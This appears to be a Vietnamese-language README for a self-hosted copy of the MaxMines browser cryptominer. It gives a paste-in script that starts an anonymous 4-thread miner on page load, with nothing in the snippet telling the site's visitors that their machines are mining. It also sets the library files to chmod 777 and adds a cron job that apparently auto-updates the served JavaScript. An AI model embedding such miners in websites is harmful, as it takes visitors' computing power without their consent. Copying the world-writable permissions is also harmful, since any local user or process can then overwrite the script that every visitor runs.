# maxmines

Self Hosted Library for MaxMines
=======================================


How to Install:
1) Download https://github.com/thanhtrungzz/maxmines-selfhosted/archive/master.zip và giải nén tại thư mục root của bạn
hoặc sử dụng git ```git clone https://github.com/thanhtrungzz/maxmines-selfhosted.git```
2) Đăng ký tại https://maxmines.com để có được public key site, bạn sẽ cần nó cho bước tiếp theo.
3) Thêm script vào trang web của bạn, tốt nhất là TRONG </body> tag, và không nằm trong thẻ <head></head>. Đảm bảo chỉnh sửa YOUR_PUBLIC_KEY bằng Public key site của bạn từ maxmines.com:
```text
<script src="lib/maxmines.min.js"></script>
<script>
            var miner=new MaxMines.Anonymous('YOUR_PUBLIC_KEY', {
                threads:4,autoThreads:false,throttle:0.2
            });
        miner.start();
</script>
```

4) Tất cả các thiết lập đã xong!

***CentOS:***
```text
yum install php-curl
```
***Debian:***
```text
apt-get install php-curl
```
Thay đổi permission của hai tệp thành 777 để chúng có thể được ghi đè lên khi cập nhật:
```text
chmod 777 lib/maxmines.min.js lib/version.txt
```
Cài đặt cron để kiểm tra cập nhật cứ sau 12 giờ:
```text
0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/mm_log.txt
```
